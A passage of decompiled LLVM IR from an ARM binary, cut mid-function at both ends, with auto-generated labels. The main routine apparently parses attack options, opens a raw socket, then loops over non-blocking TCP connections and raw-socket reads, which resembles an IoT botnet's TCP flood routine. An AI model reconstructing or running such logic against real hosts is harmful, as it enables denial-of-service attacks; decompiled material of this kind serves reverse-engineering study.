  %v4_b260 = load i32, i32* %v3_b260, align 4
  store i32 %v4_b260, i32* %r3.global-to-local, align 4
  %v3_b264 = load i32, i32* @r7, align 4
  %v4_b264 = add i32 %v3_b264, 2
  %v5_b264 = inttoptr i32 %v4_b264 to i16*
  store i16 %v1_b254, i16* %v5_b264, align 2
  %v1_b268 = load i32, i32* %r3.global-to-local, align 4
  %v2_b268 = load i32, i32* @r6, align 4
  %v3_b268 = add i32 %v2_b268, 16
  %v4_b268 = inttoptr i32 %v3_b268 to i32*
  store i32 %v1_b268, i32* %v4_b268, align 4
  br label %dec_label_pc_b0e8

dec_label_pc_b270:                                ; preds = %.thread30, %dec_label_pc_b0d4
  %v0_b270 = call i32 @function_e7dc()
  store i32 %v1_adb0, i32* %r1.global-to-local, align 4
  store i1 %v2_b278, i1* %cpsr_z.global-to-local, align 1
  %v1_b27c = load i32, i32* @r6, align 4
  %v2_b27c = add i32 %v1_b27c, 16
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v0_b270, i32* %v3_b27c, align 4
  br i1 %v2_b278, label %dec_label_pc_b0f4, label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %dec_label_pc_b0e8, %dec_label_pc_b270
  %v0_b284 = load i32, i32* @r7, align 4
  %v1_b284 = add i32 %v0_b284, 8
  store i32 %v5_ad90, i32* %r1.global-to-local, align 4
  %v2_b28c = inttoptr i32 %v1_b284 to i16*
  %v3_b28c = call i32 @function_e9dc(i16* %v2_b28c, i32 %v5_ad90)
  br label %dec_label_pc_b0f4

dec_label_pc_b294:                                ; preds = %dec_label_pc_ae08
  %v1_b298 = call i32 @function_10608(i32 %v3_adf8)
  br label %dec_label_pc_b29c

dec_label_pc_b29c:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_b294
  %v1_b2a4 = phi i32 [ %v3_adf8, %dec_label_pc_aca8 ], [ %v1_b298, %dec_label_pc_b294 ]
  store i32 %v3_aca8, i32* %r4.global-to-local, align 4
  store i32 %v6_aca8, i32* %r5.global-to-local, align 4
  store i32 %v24_aca8, i32* %fp.global-to-local, align 4
  ret i32 %v1_b2a4

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_ae30
  store i32 %v5_ad90, i32* %r2.global-to-local, align 4
  %v1_b2b0 = add i32 %v5_ad90, 8
  store i32 %v1_b2b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b064.preheader

; uselistorder directives
  uselistorder i32 %v1_b2b0, { 1, 0 }
  uselistorder i16 %v1_b254, { 1, 0 }
  uselistorder i32 %v0_b218, { 1, 0 }
  uselistorder i32 %v5_b1f0, { 1, 0 }
  uselistorder i32 %v0_b1b4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b190, { 1, 2, 0 }
  uselistorder i32 %v1_b18c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b140, { 1, 0, 2 }
  uselistorder i32 %v0_b128, { 1, 0, 2, 3 }
  uselistorder i32 %v7_b08c, { 1, 0, 2 }
  uselistorder i1 %v7_b0a4, { 2, 1, 0 }
  uselistorder i1 %v2_b278, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b25c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b000, { 1, 0 }
  uselistorder i32 %v4_af7413, { 1, 0 }
  uselistorder i32 %v3_ae98, { 1, 0 }
  uselistorder i32 %v3_ae7c, { 1, 2, 0 }
  uselistorder i32 %v1_ae78, { 1, 0 }
  uselistorder i32 %v1_ae3c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_ae38, { 1, 0, 3, 2 }
  uselistorder i32 %v0_ae34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ae30, { 1, 0, 2, 3 }
  uselistorder i1 %v7_ae28, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0 }
  uselistorder i32 %v3_adf8, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_ade4, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_adb0, { 2, 1, 3, 0 }
  uselistorder i32 %v5_ad90, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_ad44, { 1, 0 }
  uselistorder i32 %v1_ad20, { 2, 1, 0 }
  uselistorder i32 %v5_ad18, { 1, 0 }
  uselistorder i8 %v5_acfc, { 0, 2, 1 }
  uselistorder i32 %v6_acdc, { 1, 0 }
  uselistorder i32 %v2_acc4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 16, 21, 23, 22, 17, 18, 19, 20, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r2.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 3, 2, 4, 5, 7, 6, 8, 9, 11, 10, 12, 13, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 20, 23, 0, 1, 2 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b29c, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 1, 0 }
  uselistorder label %dec_label_pc_b0f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b064, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b064.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_b2c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b2c4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp34 = call i16 @__decompiler_undefined_function_1()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b2c4 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b2e0 = call i32 @function_11958(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b2ec = load i32, i32* @r6, align 4
  store i32 %v0_b2ec, i32* %r0.global-to-local, align 4
  %v2_b2f0 = call i32 @function_11958(i32 %v0_b2ec, i32 4)
  %v0_b2f4 = load i32, i32* @r5, align 4
  store i32 %v0_b2f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b304 = load i32, i32* @r4, align 4
  store i32 %v0_b304, i32* %r0.global-to-local, align 4
  %v5_b308 = inttoptr i32 %v0_b2f4 to i32*
  %v6_b308 = call i32 @function_a300(i32 %v0_b304, i32* %v5_b308, i32 2, i32 0)
  %v1_b314 = urem i32 %v6_b308, 256
  store i32 %v1_b314, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b320 = load i32, i32* @r5, align 4
  store i32 %v0_b320, i32* %r1.global-to-local, align 4
  %v0_b324 = load i32, i32* @r4, align 4
  store i32 %v0_b324, i32* %r0.global-to-local, align 4
  %v5_b328 = trunc i32 %v6_b308 to i8
  %v6_b32c = inttoptr i32 %v0_b320 to i32*
  %v7_b32c = call i32 @function_a300(i32 %v0_b324, i32* %v6_b32c, i32 3, i32 65535)
  %v0_b330 = load i32, i32* @r5, align 4
  store i32 %v0_b330, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b32c, i32* @r7, align 4
  %v0_b340 = load i32, i32* @r4, align 4
  store i32 %v0_b340, i32* %r0.global-to-local, align 4
  %v4_b344 = inttoptr i32 %v0_b330 to i32*
  %v5_b344 = call i32 @function_a300(i32 %v0_b340, i32* %v4_b344, i32 4, i32 64)
  %v1_b34c = urem i32 %v5_b344, 256
  store i32 %v1_b34c, i32* %ip.global-to-local, align 4
  %v0_b350 = load i32, i32* @r5, align 4
  store i32 %v0_b350, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b35c = load i32, i32* @r4, align 4
  store i32 %v0_b35c, i32* %r0.global-to-local, align 4
  %v6_b364 = inttoptr i32 %v0_b350 to i32*
  %v7_b364 = call i32 @function_a300(i32 %v0_b35c, i32* %v6_b364, i32 5, i32 1)
  %v1_b370 = urem i32 %v7_b364, 256
  store i32 %v1_b370, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b378 = load i32, i32* @r5, align 4
  store i32 %v0_b378, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b380 = load i32, i32* @r4, align 4
  store i32 %v0_b380, i32* %r0.global-to-local, align 4
  %v5_b388 = inttoptr i32 %v0_b378 to i32*
  %v6_b388 = call i32 @function_a300(i32 %v0_b380, i32* %v5_b388, i32 7, i32 65535)
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v3_b390 = mul i32 %v6_b388, 65536
  store i32 %v3_b390, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b39c = load i32, i32* @r4, align 4
  store i32 %v0_b39c, i32* %r0.global-to-local, align 4
  %v3_b3a0 = urem i32 %v6_b388, 65536
  store i32 %v3_b3a0, i32* @sl, align 4
  %v4_b3a4 = inttoptr i32 %v0_b38c to i32*
  %v5_b3a4 = call i32 @function_a300(i32 %v0_b39c, i32* %v4_b3a4, i32 11, i32 0)
  %v1_b3ac = urem i32 %v5_b3a4, 256
  store i32 %v1_b3ac, i32* %ip.global-to-local, align 4
  %v0_b3b0 = load i32, i32* @r5, align 4
  store i32 %v0_b3b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r4, align 4
  store i32 %v0_b3bc, i32* %r0.global-to-local, align 4
  %v5_b3c4 = inttoptr i32 %v0_b3b0 to i32*
  %v6_b3c4 = call i32 @function_a300(i32 %v0_b3bc, i32* %v5_b3c4, i32 12, i32 1)
  %v1_b3cc = urem i32 %v6_b3c4, 256
  store i32 %v1_b3cc, i32* %ip.global-to-local, align 4
  %v0_b3d0 = load i32, i32* @r5, align 4
  store i32 %v0_b3d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3dc = load i32, i32* @r4, align 4
  store i32 %v0_b3dc, i32* %r0.global-to-local, align 4
  %v5_b3e4 = inttoptr i32 %v0_b3d0 to i32*
  %v6_b3e4 = call i32 @function_a300(i32 %v0_b3dc, i32* %v5_b3e4, i32 13, i32 1)
  %v1_b3ec = urem i32 %v6_b3e4, 256
  store i32 %v1_b3ec, i32* %ip.global-to-local, align 4
  %v0_b3f0 = load i32, i32* @r5, align 4
  store i32 %v0_b3f0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b3fc = load i32, i32* @r4, align 4
  store i32 %v0_b3fc, i32* %r0.global-to-local, align 4
  %v5_b404 = inttoptr i32 %v0_b3f0 to i32*
  %v6_b404 = call i32 @function_a300(i32 %v0_b3fc, i32* %v5_b404, i32 14, i32 0)
  %v1_b40c = urem i32 %v6_b404, 256
  store i32 %v1_b40c, i32* %ip.global-to-local, align 4
  %v0_b410 = load i32, i32* @r5, align 4
  store i32 %v0_b410, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b41c = load i32, i32* @r4, align 4
  store i32 %v0_b41c, i32* %r0.global-to-local, align 4
  %v5_b424 = inttoptr i32 %v0_b410 to i32*
  %v6_b424 = call i32 @function_a300(i32 %v0_b41c, i32* %v5_b424, i32 15, i32 0)
  %v1_b42c = urem i32 %v6_b424, 256
  store i32 %v1_b42c, i32* %ip.global-to-local, align 4
  %v0_b430 = load i32, i32* @r5, align 4
  store i32 %v0_b430, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b43c = load i32, i32* @r4, align 4
  store i32 %v0_b43c, i32* %r0.global-to-local, align 4
  %v5_b444 = inttoptr i32 %v0_b430 to i32*
  %v6_b444 = call i32 @function_a300(i32 %v0_b43c, i32* %v5_b444, i32 16, i32 0)
  %v1_b44c = urem i32 %v6_b444, 256
  store i32 %v1_b44c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b458 = load i32, i32* @r5, align 4
  store i32 %v0_b458, i32* %r1.global-to-local, align 4
  %v0_b45c = load i32, i32* @r4, align 4
  store i32 %v0_b45c, i32* %r0.global-to-local, align 4
  %v5_b464 = inttoptr i32 %v0_b458 to i32*
  %v6_b464 = call i32 @function_a300(i32 %v0_b45c, i32* %v5_b464, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b474 = load i32, i32* @r5, align 4
  store i32 %v0_b474, i32* %r1.global-to-local, align 4
  %v0_b478 = load i32, i32* @r4, align 4
  store i32 %v0_b478, i32* %r0.global-to-local, align 4
  %v4_b47c = inttoptr i32 %v0_b474 to i32*
  %v5_b47c = call i32 @function_a300(i32 %v0_b478, i32* %v4_b47c, i32 1, i32 1)
  %v1_b484 = urem i32 %v5_b47c, 256
  store i32 %v1_b484, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b498 = call i32 @function_10df0(i32 2, i32 3, i32 6)
  store i32 %v3_b498, i32* %r0.global-to-local, align 4
  %v7_b49c = icmp eq i32 %v3_b498, -1
  store i1 %v7_b49c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b498, i32* @sb, align 4
  br i1 %v7_b49c, label %dec_label_pc_b68c, label %dec_label_pc_b4a8

dec_label_pc_b4a8:                                ; preds = %dec_label_pc_b2c4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b4b0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b4b0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b4c4 = call i32 @function_10dac(i32 %v3_b498, i32 0, i32 3, i32 %v6_b4b0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b4c4, i32* %r0.global-to-local, align 4
  %v7_b4c8 = icmp eq i32 %v5_b4c4, -1
  store i1 %v7_b4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4c8, label %dec_label_pc_b684, label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b4a8
  %v0_b4d0 = load i32, i32* @r7, align 4
  %v3_b4d0 = mul i32 %v0_b4d0, 65536
  store i32 %v3_b4d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b4d8 = load i32, i32* @r6, align 4
  %v2_b4d8 = icmp eq i32 %v0_b4d8, 0
  store i1 %v2_b4d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b4e0 = urem i32 %v0_b4d0, 65536
  store i32 %v3_b4e0, i32* @fp, align 4
  br i1 %v2_b4d8, label %dec_label_pc_b910, label %dec_label_pc_b4e8.preheader

dec_label_pc_b4e8.preheader:                      ; preds = %dec_label_pc_b4d0
  %v2_b534 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b578 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b5b0 = ptrtoint i32* %stack_var_-80 to i32
  %v2_b5bc = ptrtoint i32* %stack_var_-336 to i32
  %v2_b5c0 = ptrtoint i32* %stack_var_-48 to i32
  %v4_b620 = zext i8 %tmp to i32
  %v1_b624 = and i32 %v4_b620, 18
  %v2_b628 = icmp eq i32 %v1_b624, 18
  %v4_b7cc = sext i8 %v5_b328 to i32
  %sext = mul i32 %v5_b344, 16777216
  %v4_b7dc = sdiv i32 %sext, 16777216
  %v3_b60c = sext i16 %tmp61 to i32
  %v1_b630 = and i32 %v4_b620, 5
  %v2_b630 = icmp eq i32 %v1_b630, 0
  %v4_b570 = add i32 %v2_b534, 82
  %v5_b570 = inttoptr i32 %v4_b570 to i16*
  %v1_b760 = add i32 %v6_b464, 40
  %v1_b874 = urem i32 %v5_b3a4, 2
  %tmp97 = sub nsw i32 0, %v1_b874
  %v4_b87c = and i32 %tmp97, 32
  %v1_b88c = urem i32 %v6_b3c4, 2
  %tmp98 = sub nsw i32 0, %v1_b88c
  %v4_b894 = and i32 %tmp98, 16
  %v1_b8a4 = urem i32 %v6_b3e4, 2
  %tmp99 = sub nsw i32 0, %v1_b8a4
  %v4_b8ac = and i32 %tmp99, 8
  %v1_b8bc = urem i32 %v6_b404, 2
  %tmp100 = sub nsw i32 0, %v1_b8bc
  %v4_b8c4 = and i32 %tmp100, 4
  %v1_b8d4 = urem i32 %v6_b424, 2
  %tmp101 = sub nsw i32 0, %v1_b8d4
  %v3_b8dc = and i32 %tmp101, 2
  %v1_b8ec = urem i32 %v6_b444, 2
  br label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b4e8.preheader, %dec_label_pc_b65c
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b65c ], [ %tmp34, %dec_label_pc_b4e8.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b65c ], [ %tmp37, %dec_label_pc_b4e8.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b4f4 = call i32 @function_10df0(i32 2, i32 1, i32 0)
  store i32 %v3_b4f4, i32* %r0.global-to-local, align 4
  %v7_b4f8 = icmp eq i32 %v3_b4f4, -1
  store i1 %v7_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b4f4, i32* @r5, align 4
  br i1 %v7_b4f8, label %dec_label_pc_b65c, label %dec_label_pc_b504

dec_label_pc_b504:                                ; preds = %dec_label_pc_b4e8, %dec_label_pc_b638
  %v0_b50c = phi i32 [ %v3_b64c, %dec_label_pc_b638 ], [ %v3_b4f4, %dec_label_pc_b4e8 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b638 ], [ %stack_var_-62.0, %dec_label_pc_b4e8 ]
  %stack_var_-60.1 = phi i32 [ %v0_b70c, %dec_label_pc_b638 ], [ %stack_var_-60.0, %dec_label_pc_b4e8 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b50c = call i32 @function_1043c(i32 %v0_b50c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b514 = or i32 %v2_b50c, 2048
  store i32 %v1_b514, i32* %r2.global-to-local, align 4
  %v0_b518 = load i32, i32* @r5, align 4
  store i32 %v0_b518, i32* %r0.global-to-local, align 4
  %v2_b51c = call i32 @function_1043c(i32 %v0_b518, i32 4)
  %v3_b520 = load i32, i32* %stack_var_-44, align 4
  %v5_b528 = mul i32 %v3_b520, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b534, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b53c = add i32 %v5_b528, %arg2
  store i32 %v2_b53c, i32* %r3.global-to-local, align 4
  %v1_b540 = add i32 %v2_b53c, 20
  %v2_b540 = inttoptr i32 %v1_b540 to i8*
  %v3_b540 = load i8, i8* %v2_b540, align 1
  %v4_b540 = zext i8 %v3_b540 to i32
  store i32 %v4_b540, i32* %r2.global-to-local, align 4
  %v2_b544 = icmp ugt i8 %v3_b540, 30
  %v7_b544 = icmp eq i8 %v3_b540, 31
  store i1 %v7_b544, i1* %cpsr_z.global-to-local, align 1
  %v2_b548 = xor i1 %v7_b544, true
  %v3_b548 = and i1 %v2_b544, %v2_b548
  br i1 %v3_b548, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b504
  %v5_b548 = add i32 %v2_b53c, 16
  %v6_b548 = inttoptr i32 %v5_b548 to i32*
  %v7_b548 = load i32, i32* %v6_b548, align 4
  store i32 %v7_b548, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b504, %bb
  %v4_b54c = phi i32 [ %v2_b53c, %dec_label_pc_b504 ], [ %v7_b548, %bb ]
  %v4_b54c.stack_var_-60.1 = select i1 %v3_b548, i32 %v4_b54c, i32 %stack_var_-60.1
  %v2_b550 = xor i1 %v2_b544, true
  %v3_b550 = or i1 %v7_b544, %v2_b550
  br i1 %v3_b550, label %dec_label_pc_b698, label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %bb71, %dec_label_pc_b698
  %v0_b70c = phi i32 [ %v5_b6e8, %dec_label_pc_b698 ], [ %v4_b54c.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b55c = load i32, i32* @sl, align 4
  %v9_b55c = icmp eq i32 %v0_b55c, 65535
  store i1 %v9_b55c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b55c, label %dec_label_pc_b6f4, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b554
  %v4_b560 = udiv i32 %v0_b55c, 256
  %v2_b564 = urem i32 %v0_b55c, 256
  store i32 %v2_b564, i32* %r2.global-to-local, align 4
  %v5_b568 = mul nuw nsw i32 %v2_b564, 256
  %v6_b568 = or i32 %v5_b568, %v4_b560
  store i32 %v6_b568, i32* %r3.global-to-local, align 4
  store i32 %v2_b534, i32* %r0.global-to-local, align 4
  %v2_b570 = trunc i32 %v6_b568 to i16
  store i16 %v2_b570, i16* %v5_b570, align 2
  br label %dec_label_pc_b578

dec_label_pc_b578:                                ; preds = %.thread9, %dec_label_pc_b6f4
  %stack_var_-62.2 = phi i16 [ %v1_b6f4, %dec_label_pc_b6f4 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b578, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b580 = load i32, i32* @r5, align 4
  store i32 %v0_b580, i32* %r0.global-to-local, align 4
  %v3_b584 = call i32 @function_10bd8(i32 %v0_b580, i32 %v2_b578, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b58c = call i32 @function_10254(i32* null)
  store i32 %v2_b58c, i32* %r0.global-to-local, align 4
  store i32 %v2_b58c, i32* @r4, align 4
  %v9_b5ec = icmp eq i32 %tmp35, %v0_b70c
  %v4_b614 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b5ec to i32
  %v9_b600 = icmp eq i1 %v9_b5ec, false
  %v9_b618 = icmp eq i32 %v3_b60c, %v4_b614
  br label %dec_label_pc_b5a8

dec_label_pc_b598:                                ; preds = %.thread, %dec_label_pc_b608, %dec_label_pc_b630, %bb75
  %v2_b598 = call i32 @function_10254(i32* null)
  %v0_b59c = load i32, i32* @r4, align 4
  %v2_b59c = sub i32 %v2_b598, %v0_b59c
  store i32 %v2_b59c, i32* %r0.global-to-local, align 4
  %v7_b5a0 = icmp eq i32 %v2_b59c, 10
  store i1 %v7_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v8_b5a4 = icmp sgt i32 %v2_b59c, 10
  br i1 %v8_b5a4, label %dec_label_pc_b638, label %dec_label_pc_b5a8

dec_label_pc_b5a8:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b578
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b5bc, i32* %r1.global-to-local, align 4
  store i32 %v2_b5c0, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sb, align 4
  store i32 %v0_b5c8, i32* %r0.global-to-local, align 4
  %v6_b5d0 = call i32 @function_10cf8(i32 %v0_b5c8, i32 %v2_b5bc, i32 256, i32 16384, i32 %v2_b5b0, i32 %v2_b5c0)
  store i32 %v6_b5d0, i32* %r2.global-to-local, align 4
  %v7_b5d8 = icmp eq i32 %v6_b5d0, -1
  store i1 %v7_b5d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b5d8, label %dec_label_pc_b68c, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b5a8
  store i32 %v0_b70c, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b5f8 = icmp eq i32 %v6_b5d0, 40
  store i1 %v7_b5f8, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b5d0, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b5e4
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b598

bb75:                                             ; preds = %dec_label_pc_b5e4
  store i1 %v9_b600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b600, label %dec_label_pc_b598, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %bb75
  store i32 %v3_b60c, i32* @lr, align 4
  store i32 %v2_b534, i32* @r3, align 4
  store i32 %v4_b614, i32* %r2.global-to-local, align 4
  store i1 %v9_b618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b618, label %dec_label_pc_b620, label %dec_label_pc_b598

dec_label_pc_b620:                                ; preds = %dec_label_pc_b608
  store i32 %v4_b620, i32* %r2.global-to-local, align 4
  store i32 %v1_b624, i32* @r3, align 4
  store i1 %v2_b628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b628, label %dec_label_pc_b704, label %dec_label_pc_b630

dec_label_pc_b630:                                ; preds = %dec_label_pc_b620
  store i1 %v2_b630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b630, label %dec_label_pc_b598, label %dec_label_pc_b638

dec_label_pc_b638:                                ; preds = %dec_label_pc_b630, %dec_label_pc_b598
  %v0_b638 = load i32, i32* @r5, align 4
  store i32 %v0_b638, i32* %r0.global-to-local, align 4
  %v1_b63c = call i32 @function_10608(i32 %v0_b638)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b64c = call i32 @function_10df0(i32 2, i32 1, i32 0)
  store i32 %v3_b64c, i32* %r0.global-to-local, align 4
  %v3_b650 = icmp eq i32 %v3_b64c, -1
  %v8_b650 = icmp eq i32 %v3_b64c, -1
  store i1 %v8_b650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b64c, i32* @r5, align 4
  br i1 %v3_b650, label %dec_label_pc_b65c, label %dec_label_pc_b504

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b638, %dec_label_pc_b4e8, %bb82
